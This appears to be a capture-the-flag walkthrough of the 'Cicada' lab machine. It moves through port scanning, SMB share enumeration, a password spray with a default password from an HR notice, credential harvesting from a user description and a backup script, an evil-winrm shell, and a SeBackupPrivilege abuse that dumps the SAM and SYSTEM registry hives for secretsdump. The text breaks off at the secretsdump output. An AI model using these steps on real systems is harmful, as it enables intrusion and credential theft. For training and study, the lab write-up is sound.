---
title: "Cicada"
date: 2024-09-30
slug: "cicada"
tags: ["machines", "cicada", "walkthrough"]
cover: "/images/cicada/WhatsApp Image 2024-09-29 at 20.13.56_630d0615.jpg"
summary: "Walkthrough of the Cicada Machines machine covering recon, exploitation, and privilege escalation."
---
## 1: Nmap

```shell
nmap 10.10.11.35      
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-29 17:27 EEST
Stats: 0:01:06 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 48.90% done; ETC: 17:30 (0:01:09 remaining)
Stats: 0:01:45 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 82.37% done; ETC: 17:30 (0:00:22 remaining)
Nmap scan report for 10.10.11.35
Host is up (1.2s latency).
Not shown: 989 filtered tcp ports (no-response)
PORT     STATE SERVICE
53/tcp   open  domain
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  http-rpc-epmap
636/tcp  open  ldapssl
3268/tcp open  globalcatLDAP
3269/tcp open  globalcatLDAPssl

Nmap done: 1 IP address (1 host up) scanned in 133.45 seconds
```

```shell
nmap -sU 10.10.11.35
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-29 17:30 EEST
Nmap scan report for 10.10.11.35
Host is up (1.2s latency).
Not shown: 996 open|filtered udp ports (no-response)
PORT    STATE SERVICE
53/udp  open  domain
88/udp  open  kerberos-sec
123/udp open  ntp
389/udp open  ldap

Nmap done: 1 IP address (1 host up) scanned in 115.35 seconds
```

```shell
sudo nmap -sV -sC -p 53,88,135,139,389,445,464,593,636,3268,3269 10.10.11.35
[sudo] password for hussein: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-29 17:32 EEST
Stats: 0:01:49 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.93% done; ETC: 17:34 (0:00:00 remaining)
Nmap scan report for 10.10.11.35
Host is up (1.4s latency).

PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-09-29 21:33:13Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
|_ssl-date: TLS randomness does not represent time
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
|_ssl-date: TLS randomness does not represent time
Service Info: Host: CICADA-DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-09-29T21:34:17
|_  start_date: N/A
|_clock-skew: 7h00m11s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 124.70 seconds

```

## 2: SMB

```shell
smbclient -L 10.10.11.35                                                    
Password for [WORKGROUP\hussein]:

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	DEV             Disk      
	HR              Disk      
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	SYSVOL          Disk      Logon server share 
tstream_smbXcli_np_destructor: cli_close failed on pipe srvsvc. Error was NT_STATUS_IO_TIMEOUT
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.11.35 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available

```

Check for access to shares

We don't have permissions to any of the shares except //HR:

```shell
smbclient //10.10.11.35/HR 
Password for [WORKGROUP\hussein]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Mar 14 14:29:09 2024
  ..                                  D        0  Thu Mar 14 14:21:29 2024
  Notice from HR.txt                  A     1266  Wed Aug 28 20:31:48 2024

		4168447 blocks of size 4096. 335482 blocks available
smb: \> get Notice from HR.txt 
NT_STATUS_OBJECT_NAME_NOT_FOUND opening remote file \Notice
smb: \> get "Notice from HR.txt"
getting file \Notice from HR.txt of size 1266 as Notice from HR.txt (0.2 KiloBytes/sec) (average 0.2 KiloBytes/sec)
smb: \> exit

```

check the file

```shell
cat Notice\ from\ HR.txt 

Dear new hire!

Welcome to Cicada Corp! We're thrilled to have you join our team. As part of our security protocols, it's essential that you change your default password to something unique and secure.

Your default password is: Cicada$M6Corpb*@Lp#nZp!8

To change your password:

1. Log in to your Cicada Corp account** using the provided username and the default password mentioned above.
2. Once logged in, navigate to your account settings or profile settings section.
3. Look for the option to change your password. This will be labeled as "Change Password".
4. Follow the prompts to create a new password**. Make sure your new password is strong, containing a mix of uppercase letters, lowercase letters, numbers, and special characters.
5. After changing your password, make sure to save your changes.

Remember, your password is a crucial aspect of keeping your account secure. Please do not share your password with anyone, and ensure you use a complex password.

If you encounter any issues or need assistance with changing your password, don't hesitate to reach out to our support team at support@cicada.htb.

Thank you for your attention to this matter, and once again, welcome to the Cicada Corp team!

Best regards,
Cicada Corp

```

we now have a password: **Cicada$M6Corpb*@Lp#nZp!8**

## 3: Finding a user
Using this blog post: https://medium.com/@nantysean/enumerating-a-corporate-network-with-netexec-7be7537b537d
Usually there is a "guest" user in an active directory infrastructure with no password

```shell
enum4linux -a 10.10.11.35
Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Sun Sep 29 18:46:36 2024

 =========================================( Target Information )=========================================

Target ........... 10.10.11.35
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none

```

so will try an authenticated enumeration with guest user

```shell
nxc smb 10.10.11.35 -u 'guest' -p '' --rid-brute     
SMB         10.10.11.35     445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.35     445    CICADA-DC        [+] cicada.htb\guest: 
SMB         10.10.11.35     445    CICADA-DC        498: CICADA\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB         10.10.11.35     445    CICADA-DC        500: CICADA\Administrator (SidTypeUser)
SMB         10.10.11.35     445    CICADA-DC        501: CICADA\Guest (SidTypeUser)
SMB         10.10.11.35     445    CICADA-DC        502: CICADA\krbtgt (SidTypeUser)
SMB         10.10.11.35     445    CICADA-DC        512: CICADA\Domain Admins (SidTypeGroup)
SMB         10.10.11.35     445    CICADA-DC        513: CICADA\Domain Users (SidTypeGroup)
SMB         10.10.11.35     445    CICADA-DC        514: CICADA\Domain Guests (SidTypeGroup)
SMB         10.10.11.35     445    CICADA-DC        515: CICADA\Domain Computers (SidTypeGroup)
SMB         10.10.11.35     445    CICADA-DC        516: CICADA\Domain Controllers (SidTypeGroup)
SMB         10.10.11.35     445    CICADA-DC        517: CICADA\Cert Publishers (SidTypeAlias)
SMB         10.10.11.35     445    CICADA-DC        518: CICADA\Schema Admins (SidTypeGroup)
SMB         10.10.11.35     445    CICADA-DC        519: CICADA\Enterprise Admins (SidTypeGroup)
SMB         10.10.11.35     445    CICADA-DC        520: CICADA\Group Policy Creator Owners (SidTypeGroup)
SMB         10.10.11.35     445    CICADA-DC        521: CICADA\Read-only Domain Controllers (SidTypeGroup)
SMB         10.10.11.35     445    CICADA-DC        522: CICADA\Cloneable Domain Controllers (SidTypeGroup)
SMB         10.10.11.35     445    CICADA-DC        525: CICADA\Protected Users (SidTypeGroup)
SMB         10.10.11.35     445    CICADA-DC        526: CICADA\Key Admins (SidTypeGroup)
SMB         10.10.11.35     445    CICADA-DC        527: CICADA\Enterprise Key Admins (SidTypeGroup)
SMB         10.10.11.35     445    CICADA-DC        553: CICADA\RAS and IAS Servers (SidTypeAlias)
SMB         10.10.11.35     445    CICADA-DC        571: CICADA\Allowed RODC Password Replication Group (SidTypeAlias)
SMB         10.10.11.35     445    CICADA-DC        572: CICADA\Denied RODC Password Replication Group (SidTypeAlias)
SMB         10.10.11.35     445    CICADA-DC        1000: CICADA\CICADA-DC$ (SidTypeUser)
SMB         10.10.11.35     445    CICADA-DC        1101: CICADA\DnsAdmins (SidTypeAlias)
SMB         10.10.11.35     445    CICADA-DC        1102: CICADA\DnsUpdateProxy (SidTypeGroup)
SMB         10.10.11.35     445    CICADA-DC        1103: CICADA\Groups (SidTypeGroup)
SMB         10.10.11.35     445    CICADA-DC        1104: CICADA\john.smoulder (SidTypeUser)
SMB         10.10.11.35     445    CICADA-DC        1105: CICADA\sarah.dantelia (SidTypeUser)
SMB         10.10.11.35     445    CICADA-DC        1106: CICADA\michael.wrightson (SidTypeUser)
SMB         10.10.11.35     445    CICADA-DC        1108: CICADA\david.orelious (SidTypeUser)
SMB         10.10.11.35     445    CICADA-DC        1109: CICADA\Dev Support (SidTypeGroup)
SMB         10.10.11.35     445    CICADA-DC        1601: CICADA\emily.oscars (SidTypeUser)

```

## 4: Password Spray
Put the usernames and password in a text file for better performance (by advice)

```shell
cat > usernames.txt     
john.smoulder
sarah.dantelia
michael.wrightson
david.orelious
emily.oscars

```

```shell
cat > password.txt 
Cicada$M6Corpb*@Lp#nZp!8

```

Now spray the password on the usernames

```shell
nxc smb 10.10.11.35 -u usernames.txt -p password.txt 
SMB         10.10.11.35     445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.35     445    CICADA-DC        [-] Connection Error: The NETBIOS connection with the remote host timed out.
SMB         10.10.11.35     445    CICADA-DC        [-] cicada.htb\sarah.dantelia:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
SMB         10.10.11.35     445    CICADA-DC        [-] Error checking if user is admin on 10.10.11.35: Error occurs while reading from remote(104)
SMB         10.10.11.35     445    CICADA-DC        [+] cicada.htb\michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8 

```

Now we found a user with valid credentials. Time to find the user flag

## 5: SMB access with authenticated user
```shell
smbclient //10.10.11.35/NETLOGON -U "michael.wrightson"
Password for [WORKGROUP\michael.wrightson]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Mar 14 13:08:56 2024
  ..                                  D        0  Thu Mar 14 13:15:21 2024

		4168447 blocks of size 4096. 325917 blocks available
smb: \> cd ..
smb: \> ls -la
NT_STATUS_NO_SUCH_FILE listing \-la
smb: \> 

```

```shell
smbclient //10.10.11.35/SYSVOL -U "michael.wrightson"
Password for [WORKGROUP\michael.wrightson]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Aug 22 20:40:07 2024
  ..                                  D        0  Thu Mar 14 13:08:56 2024
  cicada.htb                         Dr        0  Thu Mar 14 13:08:56 2024

		4168447 blocks of size 4096. 325917 blocks available
smb: \> cd cicada.htb
smb: \cicada.htb\> ls
  .                                   D        0  Thu Mar 14 13:15:21 2024
  ..                                  D        0  Thu Mar 14 13:08:56 2024
  DfsrPrivate                      DHSr        0  Thu Mar 14 13:15:21 2024
  Policies                            D        0  Thu Mar 14 16:58:41 2024
  scripts                             D        0  Thu Mar 14 13:08:56 2024

		4168447 blocks of size 4096. 325885 blocks available
smb: \cicada.htb\> cd DfsrPrivate
cd \cicada.htb\DfsrPrivate\: NT_STATUS_ACCESS_DENIED
smb: \cicada.htb\> cd Policies
smb: \cicada.htb\Policies\> ls
  .                                   D        0  Thu Mar 14 16:58:41 2024
  ..                                  D        0  Thu Mar 14 13:15:21 2024
  {2480865A-F9E0-4995-B568-987D80F2ADEF}      D        0  Thu Mar 14 16:58:41 2024
  {31B2F340-016D-11D2-945F-00C04FB984F9}      D        0  Thu Mar 14 13:09:27 2024
  {6AC1786C-016F-11D2-945F-00C04fB984F9}      D        0  Thu Mar 14 13:09:27 2024

		4168447 blocks of size 4096. 325885 blocks available
smb: \cicada.htb\Policies\> cd ..
smb: \cicada.htb\> cd scripts
smb: \cicada.htb\scripts\> ls
  .                                   D        0  Thu Mar 14 13:08:56 2024
  ..                                  D        0  Thu Mar 14 13:15:21 2024

		4168447 blocks of size 4096. 325883 blocks available
smb: \cicada.htb\scripts\> cd ../Policies
smb: \cicada.htb\Policies\> cd {2480865A-F9E0-4995-B568-987D80F2ADEF}\
smb: \cicada.htb\Policies\{2480865A-F9E0-4995-B568-987D80F2ADEF}\> ls
  .                                   D        0  Thu Mar 14 16:58:41 2024
  ..                                  D        0  Thu Mar 14 16:58:41 2024
  GPT.INI                             A       59  Thu Aug 29 21:41:33 2024
  Machine                             D        0  Thu Mar 14 17:00:45 2024
  User                                D        0  Thu Mar 14 16:58:41 2024

		4168447 blocks of size 4096. 325883 blocks available
smb: \cicada.htb\Policies\{2480865A-F9E0-4995-B568-987D80F2ADEF}\> cd User
smb: \cicada.htb\Policies\{2480865A-F9E0-4995-B568-987D80F2ADEF}\User\> ls
  .                                   D        0  Thu Mar 14 16:58:41 2024
  ..                                  D        0  Thu Mar 14 16:58:41 2024

		4168447 blocks of size 4096. 325883 blocks available
smb: \cicada.htb\Policies\{2480865A-F9E0-4995-B568-987D80F2ADEF}\User\> cd ../Machine
smb: \cicada.htb\Policies\{2480865A-F9E0-4995-B568-987D80F2ADEF}\Machine\> ls
  .                                   D        0  Thu Mar 14 17:00:45 2024
  ..                                  D        0  Thu Mar 14 16:58:41 2024
  comment.cmtx                        A      554  Thu Mar 14 17:00:45 2024
  Registry.pol                        A      160  Thu Mar 14 17:00:45 2024

		4168447 blocks of size 4096. 325883 blocks available
smb: \cicada.htb\Policies\{2480865A-F9E0-4995-B568-987D80F2ADEF}\Machine\> exit
```

nothing here again, try again netexec tool with authenticated credentials and enumerate users and groups

![cicada-1](/images/cicada/WhatsApp Image 2024-09-29 at 20.13.56_630d0615.jpg)

now we have `david.orelious:art$Lp#7t*VQ!3`

Now try again the SMB shares

```shell
smbclient //10.10.11.35/ADMIN -U "david.orelious"                                               
Password for [WORKGROUP\david.orelious]:
session setup failed: NT_STATUS_LOGON_FAILURE

```

```shell
mbclient //10.10.11.35/C -U "david.orelious"
Password for [WORKGROUP\david.orelious]:
session setup failed: NT_STATUS_LOGON_FAILURE

```

```shell
smbclient //10.10.11.35/DEV -U "david.orelious"
Password for [WORKGROUP\david.orelious]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Mar 14 14:31:39 2024
  ..                                  D        0  Thu Mar 14 14:21:29 2024
  Backup_script.ps1                   A      601  Wed Aug 28 20:28:22 2024

		4168447 blocks of size 4096. 331546 blocks available
smb: \> get Backup_script.ps1 
getting file \Backup_script.ps1 of size 601 as Backup_script.ps1 (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
smb: \> exit

```

```shell
cat Backup_script.ps1       

$sourceDirectory = "C:\smb"
$destinationDirectory = "D:\Backup"

$username = "emily.oscars"
$password = ConvertTo-SecureString "Q!3@Lp#M6b*7t*Vt" -AsPlainText -Force
$credentials = New-Object System.Management.Automation.PSCredential($username, $password)
$dateStamp = Get-Date -Format "yyyyMMdd_HHmmss"
$backupFileName = "smb_backup_$dateStamp.zip"
$backupFilePath = Join-Path -Path $destinationDirectory -ChildPath $backupFileName
Compress-Archive -Path $sourceDirectory -DestinationPath $backupFilePath
Write-Host "Backup completed successfully. Backup file saved to: $backupFilePath"

```

now we found a user `emily.oscars:Q!3@Lp#M6b*7t*Vt`

Now try access to ADMIN and C share

```shell
smbclient //10.10.11.35/ADMIN -U "emily.oscars"
Password for [WORKGROUP\emily.oscars]:
tree connect failed: NT_STATUS_BAD_NETWORK_NAME

```

```shell
smbclient //10.10.11.35/C -U "emily.oscars"
Password for [WORKGROUP\emily.oscars]:
tree connect failed: NT_STATUS_BAD_NETWORK_NAME

```

## 6: WinRM with emily oscars user
Try another way, use this blog: https://bond-o.medium.com/crackmapexec-basics-839ef6180940

```shell
nxc winrm 10.10.11.35 -u 'emily.oscars' -p 'Q!3@Lp#M6b*7t*Vt'                                 
WINRM       10.10.11.35     5985   CICADA-DC        [*] Windows Server 2022 Build 20348 (name:CICADA-DC) (domain:cicada.htb)
WINRM       10.10.11.35     5985   CICADA-DC        [+] cicada.htb\emily.oscars:Q!3@Lp#M6b*7t*Vt (Pwn3d!)

```

so now we know there is a port 5985

```shell
nmap -sV -sC -p 5985 10.10.11.35 -Pn
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-29 20:46 EEST
Stats: 0:00:14 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 100.00% done; ETC: 20:46 (0:00:00 remaining)
Nmap scan report for 10.10.11.35
Host is up (0.77s latency).

PORT     STATE SERVICE VERSION
5985/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 78.78 seconds

```

We have some privileged access now, using this blog post: https://medium.com/@S3Curiosity/exploring-evil-winrm-a-powerful-ethical-hacking-tool-for-windows-environments-21918b56f18a

```shell
 evil-winrm -i 10.10.11.35 -u "emily.oscars" -p 'Q!3@Lp#M6b*7t*Vt'
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents> whoami
cicada\emily.oscars
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents> dir
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents> cd ..
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA> dir


    Directory: C:\Users\emily.oscars.CICADA


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-r---         8/28/2024  10:32 AM                Desktop
d-r---         8/22/2024   2:22 PM                Documents
d-r---          5/8/2021   1:20 AM                Downloads
d-r---          5/8/2021   1:20 AM                Favorites
d-r---          5/8/2021   1:20 AM                Links
d-r---          5/8/2021   1:20 AM                Music
d-r---          5/8/2021   1:20 AM                Pictures
d-----          5/8/2021   1:20 AM                Saved Games
d-r---          5/8/2021   1:20 AM                Videos


*Evil-WinRM* PS C:\Users\emily.oscars.CICADA> dir Desktop


    Directory: C:\Users\emily.oscars.CICADA\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-ar---         9/29/2024   5:32 PM             34 user.txt


*Evil-WinRM* PS C:\Users\emily.oscars.CICADA> type Desktop/user.txt
56ab35f25445c21079f991082dfb5f79
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA> 

```

First flag!!

## 7: Final flag

```shell
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA> whoami /all

USER INFORMATION
----------------

User Name           SID
=================== =============================================
cicada\emily.oscars S-1-5-21-917908876-1423158569-3159038727-1601


GROUP INFORMATION
-----------------

Group Name                                 Type             SID          Attributes
========================================== ================ ============ ==================================================
Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Backup Operators                   Alias            S-1-5-32-551 Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users            Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Certificate Service DCOM Access    Alias            S-1-5-32-574 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level       Label            S-1-16-12288


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.

```

we have this SeBackupPrivilege

and follow this https://github.com/nickvourd/Windows-Local-Privilege-Escalation-Cookbook/blob/master/Notes/SeBackupPrivilege.md

We did the backup to C:\temp12 and we want to mount it on the SMB share
```shell
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA> mkdir C:\temp12


    Directory: C:\


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         9/29/2024   6:05 PM                temp12


*Evil-WinRM* PS C:\Users\emily.oscars.CICADA> reg save hklm\sam C:\temp12\sam.hive
The operation completed successfully.

*Evil-WinRM* PS C:\Users\emily.oscars.CICADA> reg save hklm\system C:\temp12\system.hive
The operation completed successfully.

*Evil-WinRM* PS C:\Users\emily.oscars.CICADA> python --version
The term 'python' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
At line:1 char:1
+ python --version
+ ~~~~~~
    + CategoryInfo          : ObjectNotFound: (python:String) [], CommandNotFoundException
    + FullyQualifiedErrorId : CommandNotFoundException
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA> mklink /d "c:\temp12" "\\10.10.11.35\C"
The term 'mklink' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
At line:1 char:1
+ mklink /d "c:\temp12" "\\10.10.11.35\C"
+ ~~~~~~
    + CategoryInfo          : ObjectNotFound: (mklink:String) [], CommandNotFoundException
    + FullyQualifiedErrorId : CommandNotFoundException
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA> mklink /d "c:\temp12" "\\CICADA-DC\C"
The term 'mklink' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
At line:1 char:1
+ mklink /d "c:\temp12" "\\CICADA-DC\C"
+ ~~~~~~
    + CategoryInfo          : ObjectNotFound: (mklink:String) [], CommandNotFoundException
    + FullyQualifiedErrorId : CommandNotFoundException
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA> net use C:\temp12 \\CICADA-DC\C /user:cicada.htb\emily.oscars 'Q!3@Lp#M6b*7t*Vt' /persistent:yes
net.exe : The syntax of this command is:
    + CategoryInfo          : NotSpecified: (The syntax of this command is::String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError
NET USE[devicename | *] [\\computername\sharename[\volume] [password | *]]        [/USER:[domainname\]username]        [/USER:[dotted domain name\]username]        [/USER:[username@dotted domain name]        [/SMARTCARD]        [/SAVECRED]        [/REQUIREINTEGRITY]        [/REQUIREPRIVACY]        [/WRITETHROUGH]        [/TRANSPORT:{TCP | QUIC} [/SKIPCERTCHECK]]        [/REQUESTCOMPRESSION:{YES | NO}]        [/GLOBAL]        [[/DELETE] [/GLOBAL]]]NET USE {devicename | *} [password | *] /HOMENET USE [/PERSISTENT:{YES | NO}]YES
]*Evil-WinRM* PS C:\Users\emily.oscars.CICADA> YES
The term 'YES' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
At line:1 char:1
+ YES
+ ~~~
    + CategoryInfo          : ObjectNotFound: (YES:String) [], CommandNotFoundException
    + FullyQualifiedErrorId : CommandNotFoundException
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA> net use C:\temp12 \\CICADA-DC\C /user:cicada.htb\emily.oscars 'Q!3@Lp#M6b*7t*Vt' /persistent:yes
net.exe : The syntax of this command is:
    + CategoryInfo          : NotSpecified: (The syntax of this command is::String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError
NET USE[devicename | *] [\\computername\sharename[\volume] [password | *]]        [/USER:[domainname\]username]        [/USER:[dotted domain name\]username]        [/USER:[username@dotted domain name]        [/SMARTCARD]        [/SAVECRED]        [/REQUIREINTEGRITY]        [/REQUIREPRIVACY]        [/WRITETHROUGH]        [/TRANSPORT:{TCP | QUIC} [/SKIPCERTCHECK]]        [/REQUESTCOMPRESSION:{YES | NO}]        [/GLOBAL]        [[/DELETE] [/GLOBAL]]]NET USE {devicename | *} [password | *] /HOMENET USE [/PERSISTENT:{YES | NO}]YES
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA> YES
The term 'YES' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
At line:1 char:1
+ YES
+ ~~~
    + CategoryInfo          : ObjectNotFound: (YES:String) [], CommandNotFoundException
    + FullyQualifiedErrorId : CommandNotFoundException
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA> New-PSDrive -Name C:\temp12 -PSProvider FileSystem -Root "\\CICADA-DC\C" -Persist -Credential (Get-Credential)


```

it is not working for some reason, to save time, the whole C drive is already mounted


```shell
smbclient --timeout=300 //10.10.11.35/C$ -U "emily.oscars"
Password for [WORKGROUP\emily.oscars]:
Try "help" to get a list of possible commands.
smb: \> ls
  $Recycle.Bin                      DHS        0  Thu Mar 14 15:24:03 2024
  $WinREAgent                        DH        0  Mon Sep 23 19:16:49 2024
  Documents and Settings          DHSrn        0  Thu Mar 14 21:40:47 2024
  DumpStack.log.tmp                 AHS    12288  Mon Sep 30 03:31:57 2024
  pagefile.sys                      AHS 738197504  Mon Sep 30 03:31:57 2024
  PerfLogs                            D        0  Thu Aug 22 21:45:54 2024
  Program Files                      DR        0  Thu Aug 29 22:32:50 2024
  Program Files (x86)                 D        0  Sat May  8 12:40:21 2021
  ProgramData                       DHn        0  Fri Aug 30 20:32:07 2024
  Recovery                         DHSn        0  Thu Mar 14 21:41:18 2024
  Shares                              D        0  Thu Mar 14 14:21:29 2024
  System Volume Information         DHS        0  Thu Mar 14 13:18:00 2024
  TEMP                                D        0  Mon Sep 30 03:35:44 2024
  temp12                              D        0  Mon Sep 30 04:07:04 2024
  Users                              DR        0  Mon Aug 26 23:11:25 2024
  Windows                             D        0  Mon Sep 23 19:35:40 2024

		4168447 blocks of size 4096. 305627 blocks available
smb: \> cd temp12
smb: \temp12\> ls
  .                                   D        0  Mon Sep 30 04:07:04 2024
  ..                                DHS        0  Mon Sep 30 04:05:26 2024
  sam.hive                            A    49152  Mon Sep 30 04:05:57 2024
  system.hive                         A 18661376  Mon Sep 30 04:07:04 2024

		4168447 blocks of size 4096. 305625 blocks available
smb: \temp12\> get sam.hive
getting file \temp12\sam.hive of size 49152 as sam.hive (10.9 KiloBytes/sec) (average 10.9 KiloBytes/sec)
smb: \temp12\> get system.hive 
parallel_read returned NT_STATUS_IO_TIMEOUT
smb: \temp12\> getting file \temp12\system.hive of size 18661376 as system.hive SMBecho failed (NT_STATUS_CONNECTION_DISCONNECTED). The connection is disconnected now

```

looks like it was mounted correctly, however wifi is very slow and I have to increase timeout

```shell
 smbclient --timeout=3000 //10.10.11.35/C$ -U "emily.oscars"
Password for [WORKGROUP\emily.oscars]:
Try "help" to get a list of possible commands.
smb: \> cd temp
smb: \temp\> get system.hive
NT_STATUS_OBJECT_NAME_NOT_FOUND opening remote file \temp\system.hive
smb: \temp\> cd ../temp12
smb: \temp12\> get system.hive
 ^C

```

wifi network too weak.....

so I took from charbell on whatsapp

```shell
impacket-secretsdump -sam sam.hive -system system.hive LOCAL   
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[*] Target system bootKey: 0x3c2b033757a49110a9ee680b46e8d620
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
